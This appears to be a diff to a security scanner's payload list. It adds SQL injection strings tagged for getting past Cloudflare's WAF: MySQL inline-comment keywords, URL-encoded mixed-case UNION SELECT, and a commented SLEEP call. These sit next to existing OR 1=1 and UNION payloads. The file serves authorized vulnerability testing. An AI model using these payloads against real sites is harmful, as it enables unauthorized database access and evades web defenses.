@@ -4,6 +4,8 @@
 # 
 # destructive: False = Safe for testing (no data modification)
 # destructive: True = Requires --allow-destructive flag
+# Optional metadata:
+#   tags = list of context hints (e.g. waf/cloudflare) used by detectors for prioritization
 #
 # Placeholders:
 # %s = Runtime marker injection point
@@ -232,6 +234,12 @@ PAYLOADS = {
         {"payload": "%27%20OR%201=1--", "destructive": False},
         {"payload": "%27%20UNION%20SELECT%20NULL--", "destructive": False},
         {"payload": "&#39; OR 1=1--", "destructive": False},
+
+        # WAF/Cloudflare bypass - inline comments and encoding (safe)
+        {"payload": "' /*!50000OR*/ 1=1--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
+        {"payload": "' /*!50000UNION*/ SELECT NULL--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
+        {"payload": "%27%2F*!00000UnIoN*%2F%20SeLeCt%20NULL--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
+        {"payload": "' AND SLEEP/**/(0)--", "destructive": False, "tags": ["cloudflare", "obfuscated"], "description": "MySQL sleep with inline comment (safe)"},
         
         # Second-order SQLi (safe markers)
         {"payload": "admin' OR '1'='1", "destructive": False},
